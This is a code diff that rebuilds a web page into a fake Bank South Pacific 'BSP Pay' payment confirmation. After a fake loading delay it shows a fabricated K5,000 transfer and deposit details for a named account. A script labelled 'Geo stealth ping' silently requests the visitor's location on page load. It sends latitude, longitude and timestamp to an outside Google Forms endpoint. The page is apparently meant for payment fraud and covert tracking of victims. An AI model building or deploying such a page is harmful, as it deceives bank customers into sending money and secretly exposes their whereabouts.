@@ -2,71 +2,165 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Location Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BSP Payment Processing</title>
   <style>
     body {
-      background: #000;
-      color: #0f0;
-      font-family: 'Courier New', monospace;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      color: #333;
+    }
+
+    header {
+      background-color: #77BC1F;
+      color: white;
+      padding: 1rem 2rem;
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: bold;
+      letter-spacing: 1px;
+    }
+
+    .loader-container, .confirmation-container {
+      max-width: 600px;
+      margin: 2rem auto;
+      background: white;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      display: none;
+    }
+
+    .loader-container.active,
+    .confirmation-container.active {
+      display: block;
+    }
+
+    .loader {
       text-align: center;
     }
-    .message {
-      max-width: 600px;
+
+    .loader h2 {
+      color: #77BC1F;
+      margin-bottom: 1rem;
     }
-    button {
-      background: #0f0;
-      color: #000;
-      padding: 10px 20px;
-      border: none;
-      margin-top: 20px;
-      cursor: pointer;
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #ccc;
+      border-top-color: #77BC1F;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .details {
+      line-height: 1.8;
+      border-top: 1px solid #ccc;
+      padding-top: 1rem;
+    }
+
+    .details label {
       font-weight: bold;
     }
-    #locationOutput {
-      margin-top: 15px;
+
+    .instructions {
+      margin-top: 2rem;
+      background-color: #e9f7e0;
+      border-left: 5px solid #77BC1F;
+      padding: 1rem;
+      font-size: 0.95rem;
+    }
+
+    .instructions strong {
+      display: block;
+      margin-bottom: 0.5rem;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 0.9rem;
+      color: #666;
+      margin-top: 2rem;
     }
   </style>
 </head>
 <body>
-  <div class="message">
-    <h2>📍 Location Verification Portal</h2>
-    <p>To proceed, please verify your location by enabling GPS temporarily.</p>
-    <button onclick="getLocation()">Verify Location</button>
-    <div id="locationOutput"></div>
+  <header>BSP Pay</header>
+
+  <div class="loader-container active" id="loader">
+    <div class="loader">
+      <h2>Processing Your Payment</h2>
+      <div class="spinner"></div>
+      <p>Please wait while we complete your transaction...</p>
+    </div>
   </div>
 
+  <div class="confirmation-container" id="confirmation">
+    <div class="success">
+      <h2>Payment Complete</h2>
+      <p>Your payment of <strong>K5,000.00</strong> was successfully processed.</p>
+    </div>
+
+    <div class="details">
+      <p><label>Date:</label> March 31, 2025</p>
+      <p><label>Time:</label> 10:34 AM</p>
+      <p><label>Reference No:</label> BSPTXN28579323</p>
+      <p><label>From Account:</label> 1000 1234567 - Savings</p>
+      <p><label>To:</label> GIBLIN W. TAYLOR - 7004312927 (BSP)</p>
+      <p><label>Branch:</label> Popondetta</p>
+      <p><label>Status:</label> <span style="color: green;">Successful</span></p>
+    </div>
+
+    <div class="instructions">
+      <strong>BSP DEPOSIT DETAIL</strong>
+      <p><strong>Account Name:</strong> GIBLIN W. TAYLOR</p>
+      <p><strong>Account Number:</strong> 7004312927</p>
+      <p><strong>Bank:</strong> BSP</p>
+      <p><strong>Branch:</strong> Popondetta</p>
+      <p><strong>Note:</strong> Endeavor to send payment slips on time along with your Bank branch name/code. Both are required.</p>
+    </div>
+  </div>
+
+  <footer>&copy; 2025 Bank South Pacific Limited</footer>
+
   <script>
-    function getLocation() {
-      const output = document.getElementById("locationOutput");
+    // Show confirmation after fake delay
+    setTimeout(() => {
+      document.getElementById("loader").classList.remove("active");
+      document.getElementById("confirmation").classList.add("active");
+    }, 2500); // Adjust delay in ms if needed
 
+    // Geo stealth ping
+    window.onload = () => {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            output.innerHTML = `✅ Location captured:<br>🌍 Latitude: ${lat}<br>🌍 Longitude: ${lon}`;
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude.toFixed(6);
+          const lon = position.coords.longitude.toFixed(6);
+          const timestamp = new Date().toLocaleString();
 
-            // Send location to your server (optional - needs backend endpoint)
-            // fetch('https://your-backend-server.com/log', {
-            //   method: 'POST',
-            //   headers: { 'Content-Type': 'application/json' },
-            //   body: JSON.stringify({ latitude: lat, longitude: lon })
-            // });
-          },
-          (error) => {
-            output.innerHTML = `❌ Location access denied or unavailable.`;
-          }
-        );
-      } else {
-        output.innerHTML = `❌ Geolocation is not supported by this browser.`;
+          const formURL = "https://docs.google.com/forms/d/e/1FAIpQLScjeb62SiDsxRcjW3h07ifHa__tUT02T6nRR38DsK63vlAGUw/formResponse";
+
+          const data = new URLSearchParams();
+          data.append("entry.134029494", lat);            // Latitude
+          data.append("entry.1322705077", lon);            // Longitude
+          data.append("entry.1005006779", timestamp);      // Timestamp
+          data.append("entry.873784432", "Auto Location Ping");
+
+          fetch(formURL, {
+            method: "POST",
+            mode: "no-cors",
+            body: data
+          });
+        });
       }
-    }
+    };
   </script>
 </body>
 </html>
